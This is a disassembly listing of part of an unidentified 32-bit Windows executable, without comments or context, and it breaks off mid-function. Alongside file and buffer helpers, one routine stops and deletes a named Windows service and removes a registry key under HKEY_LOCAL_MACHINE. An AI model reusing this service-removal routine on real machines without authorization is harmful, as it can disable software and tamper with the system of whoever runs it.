  4043cf:	83 e8 02             	sub    $0x2,%eax
  4043d2:	74 1c                	je     0x4043f0
  4043d4:	83 e8 02             	sub    $0x2,%eax
  4043d7:	74 10                	je     0x4043e9
  4043d9:	83 e8 02             	sub    $0x2,%eax
  4043dc:	74 04                	je     0x4043e2
  4043de:	8b f1                	mov    %ecx,%esi
  4043e0:	eb 13                	jmp    0x4043f5
  4043e2:	be 05 00 00 00       	mov    $0x5,%esi
  4043e7:	eb 0c                	jmp    0x4043f5
  4043e9:	be 03 00 00 00       	mov    $0x3,%esi
  4043ee:	eb 05                	jmp    0x4043f5
  4043f0:	be 01 00 00 00       	mov    $0x1,%esi
  4043f5:	57                   	push   %edi
  4043f6:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4043fa:	8d 7b 20             	lea    0x20(%ebx),%edi
  4043fd:	50                   	push   %eax
  4043fe:	57                   	push   %edi
  4043ff:	ff 15 30 b1 40 00    	call   *0x40b130
  404405:	33 c9                	xor    %ecx,%ecx
  404407:	83 f8 ff             	cmp    $0xffffffff,%eax
  40440a:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  40440e:	c6 44 24 0c 70       	movb   $0x70,0xc(%esp)
  404413:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  404417:	88 4c 24 14          	mov    %cl,0x14(%esp)
  40441b:	74 46                	je     0x404463
  40441d:	83 fe 01             	cmp    $0x1,%esi
  404420:	75 17                	jne    0x404439
  404422:	8b 54 24 38          	mov    0x38(%esp),%edx
  404426:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  40442a:	89 54 24 0d          	mov    %edx,0xd(%esp)
  40442e:	89 4c 24 11          	mov    %ecx,0x11(%esp)
  404432:	be 03 00 00 00       	mov    $0x3,%esi
  404437:	eb 3f                	jmp    0x404478
  404439:	83 fe 03             	cmp    $0x3,%esi
  40443c:	75 11                	jne    0x40444f
  40443e:	33 d2                	xor    %edx,%edx
  404440:	be 02 00 00 00       	mov    $0x2,%esi
  404445:	89 54 24 0d          	mov    %edx,0xd(%esp)
  404449:	89 54 24 11          	mov    %edx,0x11(%esp)
  40444d:	eb 29                	jmp    0x404478
  40444f:	83 fe 05             	cmp    $0x5,%esi
  404452:	75 20                	jne    0x404474
  404454:	c7 44 24 11 ff ff ff 	movl   $0xffffffff,0x11(%esp)
  40445b:	ff 
  40445c:	be 03 00 00 00       	mov    $0x3,%esi
  404461:	eb 15                	jmp    0x404478
  404463:	33 c9                	xor    %ecx,%ecx
  404465:	be 02 00 00 00       	mov    $0x2,%esi
  40446a:	89 4c 24 0d          	mov    %ecx,0xd(%esp)
  40446e:	89 4c 24 11          	mov    %ecx,0x11(%esp)
  404472:	eb 04                	jmp    0x404478
  404474:	8b 74 24 18          	mov    0x18(%esp),%esi
  404478:	50                   	push   %eax
  404479:	ff 15 20 b1 40 00    	call   *0x40b120
  40447f:	6a 00                	push   $0x0
  404481:	68 80 00 00 00       	push   $0x80
  404486:	56                   	push   %esi
  404487:	6a 00                	push   $0x0
  404489:	6a 02                	push   $0x2
  40448b:	68 00 00 00 40       	push   $0x40000000
  404490:	57                   	push   %edi
  404491:	ff 15 40 b1 40 00    	call   *0x40b140
  404497:	83 f8 ff             	cmp    $0xffffffff,%eax
  40449a:	5f                   	pop    %edi
  40449b:	75 1d                	jne    0x4044ba
  40449d:	c7 83 28 01 00 00 00 	movl   $0x0,0x128(%ebx)
  4044a4:	00 00 00 
  4044a7:	c7 83 2c 01 00 00 00 	movl   $0x0,0x12c(%ebx)
  4044ae:	00 00 00 
  4044b1:	5e                   	pop    %esi
  4044b2:	5b                   	pop    %ebx
  4044b3:	81 c4 50 01 00 00    	add    $0x150,%esp
  4044b9:	c3                   	ret
  4044ba:	50                   	push   %eax
  4044bb:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  4044c1:	8d 54 24 08          	lea    0x8(%esp),%edx
  4044c5:	6a 09                	push   $0x9
  4044c7:	52                   	push   %edx
  4044c8:	8b cb                	mov    %ebx,%ecx
  4044ca:	e8 d1 1a 00 00       	call   0x405fa0
  4044cf:	5e                   	pop    %esi
  4044d0:	5b                   	pop    %ebx
  4044d1:	81 c4 50 01 00 00    	add    $0x150,%esp
  4044d7:	c3                   	ret
  4044d8:	90                   	nop
  4044d9:	90                   	nop
  4044da:	90                   	nop
  4044db:	90                   	nop
  4044dc:	90                   	nop
  4044dd:	90                   	nop
  4044de:	90                   	nop
  4044df:	90                   	nop
  4044e0:	83 ec 10             	sub    $0x10,%esp
  4044e3:	53                   	push   %ebx
  4044e4:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  4044e8:	55                   	push   %ebp
  4044e9:	56                   	push   %esi
  4044ea:	8b 03                	mov    (%ebx),%eax
  4044ec:	57                   	push   %edi
  4044ed:	8b 6b 04             	mov    0x4(%ebx),%ebp
  4044f0:	6a 00                	push   $0x0
  4044f2:	8b f9                	mov    %ecx,%edi
  4044f4:	68 80 00 00 00       	push   $0x80
  4044f9:	6a 03                	push   $0x3
  4044fb:	6a 00                	push   $0x0
  4044fd:	6a 02                	push   $0x2
  4044ff:	8d 4f 20             	lea    0x20(%edi),%ecx
  404502:	68 00 00 00 40       	push   $0x40000000
  404507:	51                   	push   %ecx
  404508:	89 44 24 40          	mov    %eax,0x40(%esp)
  40450c:	ff 15 40 b1 40 00    	call   *0x40b140
  404512:	8d 54 24 24          	lea    0x24(%esp),%edx
  404516:	6a 00                	push   $0x0
  404518:	8b f0                	mov    %eax,%esi
  40451a:	52                   	push   %edx
  40451b:	55                   	push   %ebp
  40451c:	56                   	push   %esi
  40451d:	ff 15 48 b1 40 00    	call   *0x40b148
  404523:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  404527:	8d 44 24 10          	lea    0x10(%esp),%eax
  40452b:	6a 00                	push   $0x0
  40452d:	83 c1 f8             	add    $0xfffffff8,%ecx
  404530:	50                   	push   %eax
  404531:	83 c3 08             	add    $0x8,%ebx
  404534:	51                   	push   %ecx
  404535:	53                   	push   %ebx
  404536:	56                   	push   %esi
  404537:	ff 15 4c b1 40 00    	call   *0x40b14c
  40453d:	56                   	push   %esi
  40453e:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  404544:	8b 44 24 10          	mov    0x10(%esp),%eax
  404548:	8b 54 24 24          	mov    0x24(%esp),%edx
  40454c:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  404550:	6a 09                	push   $0x9
  404552:	03 c5                	add    %ebp,%eax
  404554:	51                   	push   %ecx
  404555:	8b cf                	mov    %edi,%ecx
  404557:	c6 44 24 1c 70       	movb   $0x70,0x1c(%esp)
  40455c:	89 54 24 1d          	mov    %edx,0x1d(%esp)
  404560:	89 44 24 21          	mov    %eax,0x21(%esp)
  404564:	e8 37 1a 00 00       	call   0x405fa0
  404569:	5f                   	pop    %edi
  40456a:	5e                   	pop    %esi
  40456b:	5d                   	pop    %ebp
  40456c:	5b                   	pop    %ebx
  40456d:	83 c4 10             	add    $0x10,%esp
  404570:	c2 08 00             	ret    $0x8
  404573:	90                   	nop
  404574:	90                   	nop
  404575:	90                   	nop
  404576:	90                   	nop
  404577:	90                   	nop
  404578:	90                   	nop
  404579:	90                   	nop
  40457a:	90                   	nop
  40457b:	90                   	nop
  40457c:	90                   	nop
  40457d:	90                   	nop
  40457e:	90                   	nop
  40457f:	90                   	nop
  404580:	8b 44 24 04          	mov    0x4(%esp),%eax
  404584:	8b 10                	mov    (%eax),%edx
  404586:	89 51 1c             	mov    %edx,0x1c(%ecx)
  404589:	e8 32 fe ff ff       	call   0x4043c0
  40458e:	c2 04 00             	ret    $0x4
  404591:	90                   	nop
  404592:	90                   	nop
  404593:	90                   	nop
  404594:	90                   	nop
  404595:	90                   	nop
  404596:	90                   	nop
  404597:	90                   	nop
  404598:	90                   	nop
  404599:	90                   	nop
  40459a:	90                   	nop
  40459b:	90                   	nop
  40459c:	90                   	nop
  40459d:	90                   	nop
  40459e:	90                   	nop
  40459f:	90                   	nop
  4045a0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4045a4:	56                   	push   %esi
  4045a5:	8b f1                	mov    %ecx,%esi
  4045a7:	50                   	push   %eax
  4045a8:	e8 13 ef ff ff       	call   0x4034c0
  4045ad:	6a 6f                	push   $0x6f
  4045af:	8b ce                	mov    %esi,%ecx
  4045b1:	e8 2a f9 ff ff       	call   0x403ee0
  4045b6:	5e                   	pop    %esi
  4045b7:	c2 04 00             	ret    $0x4
  4045ba:	90                   	nop
  4045bb:	90                   	nop
  4045bc:	90                   	nop
  4045bd:	90                   	nop
  4045be:	90                   	nop
  4045bf:	90                   	nop
  4045c0:	56                   	push   %esi
  4045c1:	8b 74 24 08          	mov    0x8(%esp),%esi
  4045c5:	57                   	push   %edi
  4045c6:	8b f9                	mov    %ecx,%edi
  4045c8:	56                   	push   %esi
  4045c9:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  4045cf:	8d 44 30 01          	lea    0x1(%eax,%esi,1),%eax
  4045d3:	50                   	push   %eax
  4045d4:	56                   	push   %esi
  4045d5:	ff 15 50 b1 40 00    	call   *0x40b150
  4045db:	6a 71                	push   $0x71
  4045dd:	8b cf                	mov    %edi,%ecx
  4045df:	e8 fc f8 ff ff       	call   0x403ee0
  4045e4:	5f                   	pop    %edi
  4045e5:	5e                   	pop    %esi
  4045e6:	c2 04 00             	ret    $0x4
  4045e9:	90                   	nop
  4045ea:	90                   	nop
  4045eb:	90                   	nop
  4045ec:	90                   	nop
  4045ed:	90                   	nop
  4045ee:	90                   	nop
  4045ef:	90                   	nop
  4045f0:	53                   	push   %ebx
  4045f1:	8b d9                	mov    %ecx,%ebx
  4045f3:	55                   	push   %ebp
  4045f4:	57                   	push   %edi
  4045f5:	8b 6b 04             	mov    0x4(%ebx),%ebp
  4045f8:	8b 7d 00             	mov    0x0(%ebp),%edi
  4045fb:	3b fd                	cmp    %ebp,%edi
  4045fd:	74 34                	je     0x404633
  4045ff:	56                   	push   %esi
  404600:	8b f7                	mov    %edi,%esi
  404602:	8b 3f                	mov    (%edi),%edi
  404604:	6a 01                	push   $0x1
  404606:	8b 46 04             	mov    0x4(%esi),%eax
  404609:	8b 0e                	mov    (%esi),%ecx
  40460b:	89 08                	mov    %ecx,(%eax)
  40460d:	8b 16                	mov    (%esi),%edx
  40460f:	8b 46 04             	mov    0x4(%esi),%eax
  404612:	8d 4e 08             	lea    0x8(%esi),%ecx
  404615:	89 42 04             	mov    %eax,0x4(%edx)
  404618:	ff 15 2c b2 40 00    	call   *0x40b22c
  40461e:	56                   	push   %esi
  40461f:	e8 c2 60 00 00       	call   0x40a6e6
  404624:	8b 4b 08             	mov    0x8(%ebx),%ecx
  404627:	83 c4 04             	add    $0x4,%esp
  40462a:	49                   	dec    %ecx
  40462b:	3b fd                	cmp    %ebp,%edi
  40462d:	89 4b 08             	mov    %ecx,0x8(%ebx)
  404630:	75 ce                	jne    0x404600
  404632:	5e                   	pop    %esi
  404633:	8b 4b 04             	mov    0x4(%ebx),%ecx
  404636:	51                   	push   %ecx
  404637:	e8 aa 60 00 00       	call   0x40a6e6
  40463c:	83 c4 04             	add    $0x4,%esp
  40463f:	33 c0                	xor    %eax,%eax
  404641:	89 43 04             	mov    %eax,0x4(%ebx)
  404644:	89 43 08             	mov    %eax,0x8(%ebx)
  404647:	5f                   	pop    %edi
  404648:	5d                   	pop    %ebp
  404649:	5b                   	pop    %ebx
  40464a:	c3                   	ret
  40464b:	90                   	nop
  40464c:	90                   	nop
  40464d:	90                   	nop
  40464e:	90                   	nop
  40464f:	90                   	nop
  404650:	6a 18                	push   $0x18
  404652:	e8 89 60 00 00       	call   0x40a6e0
  404657:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40465b:	83 c4 04             	add    $0x4,%esp
  40465e:	85 c9                	test   %ecx,%ecx
  404660:	75 02                	jne    0x404664
  404662:	8b c8                	mov    %eax,%ecx
  404664:	89 08                	mov    %ecx,(%eax)
  404666:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40466a:	85 c9                	test   %ecx,%ecx
  40466c:	74 06                	je     0x404674
  40466e:	89 48 04             	mov    %ecx,0x4(%eax)
  404671:	c2 08 00             	ret    $0x8
  404674:	89 40 04             	mov    %eax,0x4(%eax)
  404677:	c2 08 00             	ret    $0x8
  40467a:	90                   	nop
  40467b:	90                   	nop
  40467c:	90                   	nop
  40467d:	90                   	nop
  40467e:	90                   	nop
  40467f:	90                   	nop
  404680:	8b 11                	mov    (%ecx),%edx
  404682:	8b 02                	mov    (%edx),%eax
  404684:	89 01                	mov    %eax,(%ecx)
  404686:	8b 44 24 04          	mov    0x4(%esp),%eax
  40468a:	89 10                	mov    %edx,(%eax)
  40468c:	c2 08 00             	ret    $0x8
  40468f:	90                   	nop
  404690:	8b 44 24 04          	mov    0x4(%esp),%eax
  404694:	50                   	push   %eax
  404695:	e8 4c 60 00 00       	call   0x40a6e6
  40469a:	59                   	pop    %ecx
  40469b:	c2 08 00             	ret    $0x8
  40469e:	90                   	nop
  40469f:	90                   	nop
  4046a0:	6a ff                	push   $0xffffffff
  4046a2:	68 21 ab 40 00       	push   $0x40ab21
  4046a7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4046ad:	50                   	push   %eax
  4046ae:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4046b5:	51                   	push   %ecx
  4046b6:	53                   	push   %ebx
  4046b7:	55                   	push   %ebp
  4046b8:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  4046bc:	56                   	push   %esi
  4046bd:	57                   	push   %edi
  4046be:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4046c2:	33 ff                	xor    %edi,%edi
  4046c4:	3b ef                	cmp    %edi,%ebp
  4046c6:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  4046ca:	0f 84 2c 01 00 00    	je     0x4047fc
  4046d0:	8b 74 24 28          	mov    0x28(%esp),%esi
  4046d4:	8a 06                	mov    (%esi),%al
  4046d6:	89 7d 04             	mov    %edi,0x4(%ebp)
  4046d9:	88 45 00             	mov    %al,0x0(%ebp)
  4046dc:	89 7d 08             	mov    %edi,0x8(%ebp)
  4046df:	89 7d 0c             	mov    %edi,0xc(%ebp)
  4046e2:	8b 0d 08 b2 40 00    	mov    0x40b208,%ecx
  4046e8:	8b 01                	mov    (%ecx),%eax
  4046ea:	8b 4e 08             	mov    0x8(%esi),%ecx
  4046ed:	8b d9                	mov    %ecx,%ebx
  4046ef:	3b c3                	cmp    %ebx,%eax
  4046f1:	73 02                	jae    0x4046f5
  4046f3:	8b d8                	mov    %eax,%ebx
  4046f5:	3b ee                	cmp    %esi,%ebp
  4046f7:	75 70                	jne    0x404769
  4046f9:	3b df                	cmp    %edi,%ebx
  4046fb:	8b f0                	mov    %eax,%esi
  4046fd:	76 06                	jbe    0x404705
  4046ff:	ff 15 0c b2 40 00    	call   *0x40b20c
  404705:	8b cd                	mov    %ebp,%ecx
  404707:	ff 15 10 b2 40 00    	call   *0x40b210
  40470d:	8b 45 08             	mov    0x8(%ebp),%eax
  404710:	2b c3                	sub    %ebx,%eax
  404712:	3b c6                	cmp    %esi,%eax
  404714:	73 02                	jae    0x404718
  404716:	8b f0                	mov    %eax,%esi
  404718:	3b f7                	cmp    %edi,%esi
  40471a:	76 32                	jbe    0x40474e
  40471c:	8b 55 04             	mov    0x4(%ebp),%edx
  40471f:	2b c6                	sub    %esi,%eax
  404721:	03 da                	add    %edx,%ebx
  404723:	50                   	push   %eax
  404724:	8d 04 33             	lea    (%ebx,%esi,1),%eax
  404727:	50                   	push   %eax
  404728:	53                   	push   %ebx
  404729:	ff 15 44 b2 40 00    	call   *0x40b244
  40472f:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404732:	83 c4 0c             	add    $0xc,%esp
  404735:	2b de                	sub    %esi,%ebx
  404737:	8b cd                	mov    %ebp,%ecx
  404739:	57                   	push   %edi
  40473a:	53                   	push   %ebx
  40473b:	ff 15 1c b2 40 00    	call   *0x40b21c
  404741:	84 c0                	test   %al,%al
  404743:	74 09                	je     0x40474e
  404745:	53                   	push   %ebx
  404746:	8b cd                	mov    %ebp,%ecx
  404748:	ff 15 14 b2 40 00    	call   *0x40b214
  40474e:	8b cd                	mov    %ebp,%ecx
  404750:	ff 15 10 b2 40 00    	call   *0x40b210
  404756:	5f                   	pop    %edi
  404757:	5e                   	pop    %esi
  404758:	5d                   	pop    %ebp
  404759:	5b                   	pop    %ebx
  40475a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40475e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404765:	83 c4 10             	add    $0x10,%esp
  404768:	c3                   	ret
  404769:	3b df                	cmp    %edi,%ebx
  40476b:	76 56                	jbe    0x4047c3
  40476d:	3b d9                	cmp    %ecx,%ebx
  40476f:	75 52                	jne    0x4047c3
  404771:	8b 46 04             	mov    0x4(%esi),%eax
  404774:	3b c7                	cmp    %edi,%eax
  404776:	75 05                	jne    0x40477d
  404778:	a1 28 b2 40 00       	mov    0x40b228,%eax
  40477d:	80 78 ff fe          	cmpb   $0xfe,-0x1(%eax)
  404781:	73 40                	jae    0x4047c3
  404783:	6a 01                	push   $0x1
  404785:	8b cd                	mov    %ebp,%ecx
  404787:	ff 15 2c b2 40 00    	call   *0x40b22c
  40478d:	8b 46 04             	mov    0x4(%esi),%eax
  404790:	3b c7                	cmp    %edi,%eax
  404792:	75 05                	jne    0x404799
  404794:	a1 28 b2 40 00       	mov    0x40b228,%eax
  404799:	89 45 04             	mov    %eax,0x4(%ebp)
  40479c:	8b 4e 08             	mov    0x8(%esi),%ecx
  40479f:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4047a2:	8b 56 0c             	mov    0xc(%esi),%edx
  4047a5:	89 55 0c             	mov    %edx,0xc(%ebp)
  4047a8:	8a 48 ff             	mov    -0x1(%eax),%cl
  4047ab:	5f                   	pop    %edi
  4047ac:	fe c1                	inc    %cl
  4047ae:	5e                   	pop    %esi
  4047af:	5d                   	pop    %ebp
  4047b0:	88 48 ff             	mov    %cl,-0x1(%eax)
  4047b3:	5b                   	pop    %ebx
  4047b4:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4047b8:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4047bf:	83 c4 10             	add    $0x10,%esp
  4047c2:	c3                   	ret
  4047c3:	6a 01                	push   $0x1
  4047c5:	53                   	push   %ebx
  4047c6:	8b cd                	mov    %ebp,%ecx
  4047c8:	ff 15 1c b2 40 00    	call   *0x40b21c
  4047ce:	84 c0                	test   %al,%al
  4047d0:	74 2a                	je     0x4047fc
  4047d2:	8b 76 04             	mov    0x4(%esi),%esi
  4047d5:	3b f7                	cmp    %edi,%esi
  4047d7:	75 06                	jne    0x4047df
  4047d9:	8b 35 28 b2 40 00    	mov    0x40b228,%esi
  4047df:	8b 7d 04             	mov    0x4(%ebp),%edi
  4047e2:	8b cb                	mov    %ebx,%ecx
  4047e4:	8b c1                	mov    %ecx,%eax
  4047e6:	c1 e9 02             	shr    $0x2,%ecx
  4047e9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4047eb:	8b c8                	mov    %eax,%ecx
  4047ed:	83 e1 03             	and    $0x3,%ecx
  4047f0:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4047f2:	8b 4d 04             	mov    0x4(%ebp),%ecx
  4047f5:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4047f8:	c6 04 19 00          	movb   $0x0,(%ecx,%ebx,1)
  4047fc:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  404800:	5f                   	pop    %edi
  404801:	5e                   	pop    %esi
  404802:	5d                   	pop    %ebp
  404803:	5b                   	pop    %ebx
  404804:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40480b:	83 c4 10             	add    $0x10,%esp
  40480e:	c3                   	ret
  40480f:	90                   	nop
  404810:	c3                   	ret
  404811:	90                   	nop
  404812:	90                   	nop
  404813:	90                   	nop
  404814:	90                   	nop
  404815:	90                   	nop
  404816:	90                   	nop
  404817:	90                   	nop
  404818:	90                   	nop
  404819:	90                   	nop
  40481a:	90                   	nop
  40481b:	90                   	nop
  40481c:	90                   	nop
  40481d:	90                   	nop
  40481e:	90                   	nop
  40481f:	90                   	nop
  404820:	56                   	push   %esi
  404821:	8b f1                	mov    %ecx,%esi
  404823:	8b 46 04             	mov    0x4(%esi),%eax
  404826:	85 c0                	test   %eax,%eax
  404828:	74 1d                	je     0x404847
  40482a:	8d 48 ff             	lea    -0x1(%eax),%ecx
  40482d:	8a 40 ff             	mov    -0x1(%eax),%al
  404830:	84 c0                	test   %al,%al
  404832:	74 0a                	je     0x40483e
  404834:	3c ff                	cmp    $0xff,%al
  404836:	74 06                	je     0x40483e
  404838:	fe c8                	dec    %al
  40483a:	88 01                	mov    %al,(%ecx)
  40483c:	eb 09                	jmp    0x404847
  40483e:	51                   	push   %ecx
  40483f:	e8 a2 5e 00 00       	call   0x40a6e6
  404844:	83 c4 04             	add    $0x4,%esp
  404847:	8a 44 24 08          	mov    0x8(%esp),%al
  40484b:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  404852:	a8 01                	test   $0x1,%al
  404854:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  40485b:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  404862:	74 09                	je     0x40486d
  404864:	56                   	push   %esi
  404865:	e8 7c 5e 00 00       	call   0x40a6e6
  40486a:	83 c4 04             	add    $0x4,%esp
  40486d:	8b c6                	mov    %esi,%eax
  40486f:	5e                   	pop    %esi
  404870:	c2 04 00             	ret    $0x4
  404873:	90                   	nop
  404874:	90                   	nop
  404875:	90                   	nop
  404876:	90                   	nop
  404877:	90                   	nop
  404878:	90                   	nop
  404879:	90                   	nop
  40487a:	90                   	nop
  40487b:	90                   	nop
  40487c:	90                   	nop
  40487d:	90                   	nop
  40487e:	90                   	nop
  40487f:	90                   	nop
  404880:	55                   	push   %ebp
  404881:	8b ec                	mov    %esp,%ebp
  404883:	6a ff                	push   $0xffffffff
  404885:	68 88 b4 40 00       	push   $0x40b488
  40488a:	68 62 a7 40 00       	push   $0x40a762
  40488f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404895:	50                   	push   %eax
  404896:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40489d:	81 ec 30 05 00 00    	sub    $0x530,%esp
  4048a3:	53                   	push   %ebx
  4048a4:	56                   	push   %esi
  4048a5:	57                   	push   %edi
  4048a6:	33 ff                	xor    %edi,%edi
  4048a8:	89 bd c0 fa ff ff    	mov    %edi,-0x540(%ebp)
  4048ae:	89 bd c4 fe ff ff    	mov    %edi,-0x13c(%ebp)
  4048b4:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4048b7:	68 3f 00 0f 00       	push   $0xf003f
  4048bc:	57                   	push   %edi
  4048bd:	57                   	push   %edi
  4048be:	ff 15 1c b0 40 00    	call   *0x40b01c
  4048c4:	8b d8                	mov    %eax,%ebx
  4048c6:	89 9d c4 fe ff ff    	mov    %ebx,-0x13c(%ebp)
  4048cc:	68 ff 01 0f 00       	push   $0xf01ff
  4048d1:	8b 45 08             	mov    0x8(%ebp),%eax
  4048d4:	50                   	push   %eax
  4048d5:	53                   	push   %ebx
  4048d6:	ff 15 18 b0 40 00    	call   *0x40b018
  4048dc:	8b f0                	mov    %eax,%esi
  4048de:	89 b5 c0 fa ff ff    	mov    %esi,-0x540(%ebp)
  4048e4:	3b df                	cmp    %edi,%ebx
  4048e6:	75 04                	jne    0x4048ec
  4048e8:	3b f7                	cmp    %edi,%esi
  4048ea:	74 7b                	je     0x404967
  4048ec:	8d 8d c8 fe ff ff    	lea    -0x138(%ebp),%ecx
  4048f2:	51                   	push   %ecx
  4048f3:	56                   	push   %esi
  4048f4:	ff 15 04 b0 40 00    	call   *0x40b004
  4048fa:	85 c0                	test   %eax,%eax
  4048fc:	74 69                	je     0x404967
  4048fe:	83 bd cc fe ff ff 01 	cmpl   $0x1,-0x134(%ebp)
  404905:	74 1f                	je     0x404926
  404907:	8d 95 c8 fe ff ff    	lea    -0x138(%ebp),%edx
  40490d:	52                   	push   %edx
  40490e:	6a 01                	push   $0x1
  404910:	56                   	push   %esi
  404911:	ff 15 08 b0 40 00    	call   *0x40b008
  404917:	85 c0                	test   %eax,%eax
  404919:	74 4c                	je     0x404967
  40491b:	68 20 03 00 00       	push   $0x320
  404920:	ff 15 c4 b0 40 00    	call   *0x40b0c4
  404926:	56                   	push   %esi
  404927:	ff 15 0c b0 40 00    	call   *0x40b00c
  40492d:	b9 00 01 00 00       	mov    $0x100,%ecx
  404932:	33 c0                	xor    %eax,%eax
  404934:	8d bd c4 fa ff ff    	lea    -0x53c(%ebp),%edi
  40493a:	f3 ab                	rep stos %eax,%es:(%edi)
  40493c:	8b 45 08             	mov    0x8(%ebp),%eax
  40493f:	50                   	push   %eax
  404940:	68 c4 e1 40 00       	push   $0x40e1c4
  404945:	8d 8d c4 fa ff ff    	lea    -0x53c(%ebp),%ecx
  40494b:	51                   	push   %ecx
  40494c:	ff 15 78 b3 40 00    	call   *0x40b378
  404952:	83 c4 0c             	add    $0xc,%esp
  404955:	8d 95 c4 fa ff ff    	lea    -0x53c(%ebp),%edx
  40495b:	52                   	push   %edx
  40495c:	68 02 00 00 80       	push   $0x80000002
  404961:	ff 15 ec b2 40 00    	call   *0x40b2ec
  404967:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40496e:	e8 1d 00 00 00       	call   0x404990
  404973:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404976:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40497d:	5f                   	pop    %edi
  40497e:	5e                   	pop    %esi
  40497f:	5b                   	pop    %ebx
  404980:	8b e5                	mov    %ebp,%esp
  404982:	5d                   	pop    %ebp
  404983:	c3                   	ret
  404984:	8b b5 c0 fa ff ff    	mov    -0x540(%ebp),%esi
  40498a:	8b 9d c4 fe ff ff    	mov    -0x13c(%ebp),%ebx
  404990:	85 f6                	test   %esi,%esi
  404992:	74 07                	je     0x40499b
  404994:	56                   	push   %esi
  404995:	ff 15 10 b0 40 00    	call   *0x40b010
  40499b:	85 db                	test   %ebx,%ebx
  40499d:	74 07                	je     0x4049a6
  40499f:	53                   	push   %ebx
  4049a0:	ff 15 10 b0 40 00    	call   *0x40b010
  4049a6:	c3                   	ret
  4049a7:	90                   	nop
  4049a8:	90                   	nop
  4049a9:	90                   	nop
  4049aa:	90                   	nop
  4049ab:	90                   	nop
  4049ac:	90                   	nop
  4049ad:	90                   	nop
  4049ae:	90                   	nop
  4049af:	90                   	nop
  4049b0:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4049b4:	53                   	push   %ebx
  4049b5:	55                   	push   %ebp
  4049b6:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  4049ba:	56                   	push   %esi
  4049bb:	57                   	push   %edi
  4049bc:	85 c9                	test   %ecx,%ecx
  4049be:	75 0c                	jne    0x4049cc
  4049c0:	8b fd                	mov    %ebp,%edi
  4049c2:	83 c9 ff             	or     $0xffffffff,%ecx
  4049c5:	33 c0                	xor    %eax,%eax
  4049c7:	f2 ae                	repnz scas %es:(%edi),%al
  4049c9:	f7 d1                	not    %ecx
  4049cb:	49                   	dec    %ecx
  4049cc:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4049d0:	33 ff                	xor    %edi,%edi
  4049d2:	85 c0                	test   %eax,%eax
  4049d4:	7e 27                	jle    0x4049fd
  4049d6:	8b 44 24 14          	mov    0x14(%esp),%eax
  4049da:	33 d2                	xor    %edx,%edx
  4049dc:	85 c9                	test   %ecx,%ecx
  4049de:	7e 10                	jle    0x4049f0
  4049e0:	8d 34 07             	lea    (%edi,%eax,1),%esi
  4049e3:	8a 1c 16             	mov    (%esi,%edx,1),%bl
  4049e6:	3a 1c 2a             	cmp    (%edx,%ebp,1),%bl
  4049e9:	75 05                	jne    0x4049f0
  4049eb:	42                   	inc    %edx
  4049ec:	3b d1                	cmp    %ecx,%edx
  4049ee:	7c f3                	jl     0x4049e3
  4049f0:	3b d1                	cmp    %ecx,%edx
  4049f2:	74 11                	je     0x404a05
  4049f4:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  4049f8:	47                   	inc    %edi
  4049f9:	3b fa                	cmp    %edx,%edi
  4049fb:	7c dd                	jl     0x4049da
  4049fd:	5f                   	pop    %edi
  4049fe:	5e                   	pop    %esi
  4049ff:	5d                   	pop    %ebp
  404a00:	83 c8 ff             	or     $0xffffffff,%eax
  404a03:	5b                   	pop    %ebx
  404a04:	c3                   	ret
  404a05:	8b c7                	mov    %edi,%eax
  404a07:	5f                   	pop    %edi
  404a08:	5e                   	pop    %esi
  404a09:	5d                   	pop    %ebp
  404a0a:	5b                   	pop    %ebx
  404a0b:	c3                   	ret
  404a0c:	90                   	nop
  404a0d:	90                   	nop
  404a0e:	90                   	nop
  404a0f:	90                   	nop
  404a10:	81 ec 08 01 00 00    	sub    $0x108,%esp
  404a16:	8b 8c 24 0c 01 00 00 	mov    0x10c(%esp),%ecx
  404a1d:	56                   	push   %esi
  404a1e:	57                   	push   %edi
  404a1f:	8d 44 24 0c          	lea    0xc(%esp),%eax
  404a23:	68 04 01 00 00       	push   $0x104
  404a28:	50                   	push   %eax
  404a29:	51                   	push   %ecx
  404a2a:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  404a31:	00 
  404a32:	ff 15 54 b1 40 00    	call   *0x40b154
  404a38:	6a 00                	push   $0x0
  404a3a:	6a 00                	push   $0x0
